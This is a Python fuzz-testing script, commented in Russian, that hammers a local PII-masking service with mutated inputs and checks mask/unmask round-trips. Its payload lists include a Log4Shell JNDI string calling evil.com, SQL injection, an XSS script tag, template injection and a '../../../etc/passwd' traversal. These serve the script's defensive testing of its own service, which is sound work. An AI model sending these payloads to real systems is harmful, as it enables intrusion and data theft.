import asyncio
import time
import random
import string
import uuid
import aiohttp

URL = "http://127.0.0.1:8000/process"
DURATION_SEC = 120

# Мутаторы и генераторы фаззинг-мусора
UNICODE_CHAOS = [
    "\x00", "\x01", "\r", "\n", "\t", "\ufeff", "\u200b", "\u200c", "\u200d", "\ufffd",
    "﷽", "𝓣𝓮𝓼𝓽", "⚡️🔥💥", "SELECT * FROM users; --", "<script>alert(1)</script>",
    "{{ 7 * 7 }}", "${jndi:ldap://evil.com/x}", "%s%s%s%s%s%s", "\\x00\\xff\\xfe",
    "A" * 500, "1" * 1000, "й" * 2000, " " * 50, "null", "undefined", "NaN", "true", "false",
    "[]", "{}", "[FIO_1]", "[ADDRESS_9999]", "[PASSPORT_0]", "None"
]

CORPUS_PIECES = [
    "Иванов Иван Иванович", "паспорт 4509 123456", "тел +7 926 111-22-33",
    "карта 2200 1234 5678 9019", "Красноярский бульвар д 11", "ИНН 7707083893",
    "cvv 883", "pin 1234", "Сбербанк", "ООО Ромашка", "email test@alfa.ru",
    "28.09.1990", "военный билет АБ 1234567", "св-во о рождении IV-ЕР 123456"
]

def generate_fuzz_payload():
    mode = random.randint(1, 6)
    
    if mode == 1:
        # Случайный бинарный/юникод мусор разной длины
        length = random.choice([0, 1, 5, 20, 100, 500, 2000, 50000])
        chars = string.printable + "".join(UNICODE_CHAOS)
        return "".join(random.choice(chars) for _ in range(length))
        
    elif mode == 2:
        # Корректные ПДн, перемешанные с инъекциями и управляющими символами
        parts = []
        for _ in range(random.randint(1, 10)):
            if random.random() < 0.6:
                parts.append(random.choice(CORPUS_PIECES))
            else:
                parts.append(random.choice(UNICODE_CHAOS))
        sep = random.choice([" ", ", ", "; ", "\n", "\t", "\x00", "---", ""])
        return sep.join(parts)
        
    elif mode == 3:
        # Экстремально сломанные токены маскирования (попытка сбить демаскировщик)
        return " ".join([f"[{random.choice(['FIO', 'ADDRESS', 'CARD', 'INV'])}_{random.randint(-10, 500)}]" for _ in range(random.randint(1, 20))])
        
    elif mode == 4:
        # Вложенные скобки, экраны и псевдо-JSON
        return '{"client": "' + random.choice(CORPUS_PIECES) + '", "notes": "' + "".join(random.choices(UNICODE_CHAOS, k=5)) + '"}'
        
    elif mode == 5:
        # Пограничные длины строк
        return random.choice(["", " ", "\n", "A" * 700, "Б" * 524287, "В" * 530000])
        
    else:
        # Обычные валидные ПДн с небольшими случайными мутациями
        base = f"Клиент {random.choice(CORPUS_PIECES)}, {random.choice(CORPUS_PIECES)}, {random.choice(CORPUS_PIECES)}"
        mutated = list(base)
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(mutated) - 1)
            mutated[pos] = random.choice(UNICODE_CHAOS)
        return "".join(mutated)

def generate_fuzz_payload_id():
    mode = random.randint(1, 5)
    if mode == 1:
        return str(uuid.uuid4())
    elif mode == 2:
        return random.choice(["", " ", "a", "123", "null", "undefined", "\x00", "test/id", "../../../etc/passwd"])
    elif mode == 3:
        return "".join(random.choices(string.ascii_letters + string.digits, k=random.choice([1, 10, 64, 256])))
    elif mode == 4:
        return "⚡️🔥" + str(random.randint(1, 100000))
    else:
        return "test-fuzz-" + random.choice(UNICODE_CHAOS)

async def main():
    print(f"=== ЗАПУСК 2-МИНУТНОГО ФАЗЗИНГ-ТЕСТА (Duration: {DURATION_SEC}s) ===")
    start_time = time.time()
    end_time = start_time + DURATION_SEC
    
    stats = {
        "total_sent": 0,
        "status_200": 0,
        "status_400_422": 0,   # Ожидаемый отлуп валидации
        "status_500": 0,       # КРИТИЧЕСКИЙ БАГ
        "exceptions": 0,       # Сетевые обрывы / краши сервиса
        "roundtrip_ok": 0,     # Маскирование -> демаскирование прошло без искажений
        "roundtrip_fail": 0
    }
    
    conn = aiohttp.TCPConnector(limit=100)
    timeout = aiohttp.ClientTimeout(total=10.0)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        async def fuzz_step():
            payload = generate_fuzz_payload()
            payload_id = generate_fuzz_payload_id()
            req_data = {"payload": payload, "payload_id": payload_id}
            
            stats["total_sent"] += 1
            try:
                # 1. Посылаем случайный фаззинг-запрос на маскирование
                async with session.post(URL, json=req_data) as resp:
                    code = resp.status
                    if code == 200:
                        stats["status_200"] += 1
                        data = await resp.json()
                        masked = data.get("result", "")
                        
                        # 2. Если маскирование прошло успешно, сразу пробуем обратный шаг демаскирования
                        demask_req = {"payload": masked, "payload_id": payload_id}
                        async with session.post(URL, json=demask_req) as d_resp:
                            if d_resp.status == 200:
                                d_data = await d_resp.json()
                                unmasked = d_data.get("result", "")
                                if unmasked == payload:
                                    stats["roundtrip_ok"] += 1
                                else:
                                    stats["roundtrip_fail"] += 1
                            elif d_resp.status >= 500:
                                stats["status_500"] += 1
                            else:
                                stats["status_400_422"] += 1
                                
                    elif 400 <= code < 500:
                        stats["status_400_422"] += 1
                    elif code >= 500:
                        stats["status_500"] += 1
                        print(f"[!] 500 Internal Server Error на payload_id: {repr(payload_id)}")
            except Exception as e:
                stats["exceptions"] += 1

        tasks = set()
        last_report = time.time()
        
        while time.time() < end_time:
            if len(tasks) < 50:
                t = asyncio.create_task(fuzz_step())
                tasks.add(t)
                t.add_done_callback(tasks.discard)
            else:
                await asyncio.sleep(0.01)
                
            if time.time() - last_report >= 20:
                last_report = time.time()
                elapsed = int(time.time() - start_time)
                print(f"[{elapsed}s/{DURATION_SEC}s] Запросов: {stats['total_sent']} | 200 OK: {stats['status_200']} | 4xx: {stats['status_400_422']} | 500 Error: {stats['status_500']} | Roundtrips OK: {stats['roundtrip_ok']}")

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    actual_duration = time.time() - start_time
    print("\n==================== РЕЗУЛЬТАТЫ ФАЗЗИНГА ====================")
    print(f"Время тестирования: {actual_duration:.2f} сек")
    print(f"Всего отправлено фаззинг-мутаций: {stats['total_sent']}")
    print(f"Успешно обработано (HTTP 200): {stats['status_200']}")
    print(f"Отклонено валидатором (HTTP 400/422): {stats['status_400_422']}")
    print(f"Критические падения сервиса (HTTP 500): {stats['status_500']}")
    print(f"Обрывы соединения / Crash / Timeout: {stats['exceptions']}")
    print(f"Корректных циклов маскирование->демаскирование: {stats['roundtrip_ok']}")
    if stats['roundtrip_fail'] > 0:
        print(f"Несоответствий при демаскировании: {stats['roundtrip_fail']}")
    print("=============================================================")

if __name__ == "__main__":
    asyncio.run(main())
